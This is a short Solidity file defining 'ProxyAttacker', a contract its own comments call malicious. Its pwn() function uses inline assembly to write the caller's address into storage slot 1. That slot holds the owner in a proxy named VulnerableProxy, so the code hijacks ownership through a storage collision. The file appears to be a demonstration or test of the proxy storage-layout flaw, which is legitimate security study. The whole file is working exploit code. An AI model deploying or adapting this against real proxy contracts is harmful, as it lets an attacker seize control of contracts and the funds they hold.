// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @dev Malicious "implementation" that overwrites slot used by proxy's owner.
 * In VulnerableProxy, owner is stored after implementation, so it lives in slot 1.
 */
contract ProxyAttacker {
    // Writes to storage slot 1 (owner slot in VulnerableProxy)
    function pwn() external {
        assembly {
            sstore(1, caller())
        }
    }
}
